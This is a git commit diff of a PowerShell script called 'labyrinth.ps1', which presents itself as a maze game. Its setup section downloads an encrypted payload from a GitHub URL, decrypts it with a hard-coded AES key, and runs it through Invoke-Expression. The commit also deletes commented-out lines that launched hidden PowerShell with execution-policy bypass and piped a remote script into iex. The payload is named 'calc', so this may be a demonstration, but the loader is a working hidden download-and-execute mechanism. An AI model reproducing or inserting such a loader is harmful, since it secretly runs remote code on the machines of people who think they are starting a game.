294a8729788185df067e1449a3fa71a29606ff4f
Giovanni Piccolo <piccolog93@gmail.com>
2025-11-06 14:19:04 +0100

    Update labyrinth.ps1

--- labyrinth.ps1
+++ labyrinth.ps1
@@ -91,13 +91,9 @@ function New-Labyrinth {
 # --- 2. SETUP THE GAME ---
 Clear-Host
 
-
 $key_b64   = "JxkIC5hdeFn22yHVp+BXlkhKnfqkNyh733dhlHGfk4g="
 $iv_b64    = "40s4YD1TaV08ZTOdrn1eoA=="
 $url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.enc"
-#$key_b64   = "P+zcMUiVdfCg+qm2jpBfg4BSNHNX16FKgbUncJIQc2U="
-#$iv_b64    = "lQekH4XYZ4W5yE+gZg4inw=="
-#$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.enc"
 $data_b64  = (New-Object Net.WebClient).DownloadString($url)
 $keyBytes = [System.Convert]::FromBase64String($key_b64)
 $ivBytes  = [System.Convert]::FromBase64String($iv_b64)
@@ -110,10 +106,7 @@ $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedB
 $decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
 $aes.Dispose()
 $decryptor.Dispose()
-#Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -Command calc.exe" -WindowStyle Hidden
-#Start-Process -FilePath "powershell.exe" -ArgumentList '-ExecutionPolicy Bypass -Command irm "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.ps1" | iex' -WindowStyle Hidden
 Invoke-Expression $decryptedCommand
-
 
 [Console]::CursorVisible = $false
 
